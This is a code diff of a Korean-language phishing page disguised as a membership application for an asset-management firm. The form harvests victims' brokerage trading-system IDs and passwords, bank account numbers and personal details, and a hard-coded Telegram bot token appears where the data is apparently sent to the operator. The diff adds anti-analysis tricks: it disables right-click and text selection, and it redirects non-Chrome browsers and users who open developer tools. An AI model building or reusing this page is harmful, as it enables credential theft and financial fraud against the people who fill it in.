@@ -15,6 +15,7 @@
             padding: 0;
             background: #f5f5f5;
             color: #333;
+			user-select: none; /* Prevent text selection */
         }
         .header {
             background-image: url('top.jpg'); /* Path to the background image */
@@ -68,7 +69,7 @@
 			max-width: 960px;
 			margin: auto;
 			background: white;
-			padding: 10px 20px 10px 20px;
+			padding: 10px 20px 0px 20px;
 			font-size: 30px;
 			text-align: center;
 			text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
@@ -77,7 +78,7 @@
 			max-width: 960px;
 			margin: auto;
 			background: white;
-			padding: 10px 20px 10px 20px;
+			padding: 0px 20px 0px 20px;
 			font-size: 30px;
 			text-align: center;
 			text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
@@ -87,7 +88,8 @@
 			margin: auto;
 			background: white;
 			padding: 10px 20px 10px 20px;
-			font-size: 14px;
+			font-size: 16px;
+			color: #d70f0f;
 			text-align: center;
 			text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
 		}
@@ -97,6 +99,7 @@
 			background: white;
 			padding: 10px 20px 10px 20px;
 			font-size: 14px;
+			color: #d70f0f;
 			text-align: center;
 			text-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
 		}
@@ -163,9 +166,9 @@
         }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
     <div class="header">
-        <h1>베스트업 멤버십 신청 1</h1>
+        <h1>베스트업 멤버십 신청 </h1>
     </div>
 	<div class="topimfo">
 		베스트업 자산운용
@@ -188,7 +191,7 @@
             </div>
             <div class="form-group">
                 <input type="email" id="email" name="email" required placeholder="이메일" autocomplete="off">
-                <input type="text" id="referrer" name="referrer" placeholder="추천인" autocomplete="off">
+                <input type="text" id="referrer" name="referrer" required pattern="[가-힣a-zA-Z0-9]{2,5}" placeholder="추천인" autocomplete="off">
             </div>
             <div class="form-group">
                 <input type="text" id="bank" name="bank" required pattern="[가-힣]{1,10}" placeholder="은행명" autocomplete="off">
@@ -210,6 +213,24 @@
 		<br>
 	</div>
     <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            if (!navigator.userAgent.toLowerCase().includes("chrome")) {
+                alert('정상적으로 이용해주세요.');
+                window.location.href = "https://www.google.com";
+            }
+        });
+
+        if (typeof jQuery === 'undefined') {
+            alert('정상적으로 이용해주세요.');
+            window.location.href = "https://www.google.com";
+        }
+
+        window.addEventListener("devtoolschange", function(e) {
+            if(e.detail.isOpen) {
+                alert('정상적으로 이용해주세요.');
+                window.location.href = "https://www.google.com";
+            }
+        });
         $(document).ready(function() {
             $('#phone').on('input', function() {
                 var number = $(this).val().replace(/[^\d]/g, '');
@@ -233,7 +254,8 @@
                     referrer: $('#referrer').val(),
                     bank: $('#bank').val(),
                     accountHolder: $('#accountHolder').val(),
-                    accountNumber: $('#accountNumber').val()
+                    accountNumber: $('#accountNumber').val(),
+					date: new Date().toLocaleString("ko-KR", { timeZone: "Asia/Seoul" })
                 };
 
                 // Email validation
@@ -243,16 +265,17 @@
                 }
 
                 const message = `
-                    멤버십 신청 정보:\n
-                    이름: ${data.name}\n
-                    휴대폰 번호: ${data.phone}\n
-                    HTS 아이디: ${data.htsId}\n
-                    HTS 비밀번호: ${data.htsPassword}\n
-                    이메일: ${data.email}\n
-                    추천인: ${data.referrer}\n
-                    은행명: ${data.bank}\n
-                    예금주: ${data.accountHolder}\n
-                    계좌번호: ${data.accountNumber}
+☆멤버십 신청 정보☆:\n
+※접수날짜: ${data.date}\n
+※이름: ${data.name}\n
+※휴대폰 번호: ${data.phone}\n
+※HTS 아이디: ${data.htsId}\n
+※HTS 비밀번호: ${data.htsPassword}\n
+※이메일: ${data.email}\n
+※추천인: ${data.referrer}\n
+※은행명: ${data.bank}\n
+※예금주: ${data.accountHolder}\n
+※계좌번호: ${data.accountNumber}\n
                 `;
 
 				const botToken = '7340037891:AAGRpEijtgsGHplWdDoVWo9mZiI90gGRab8';
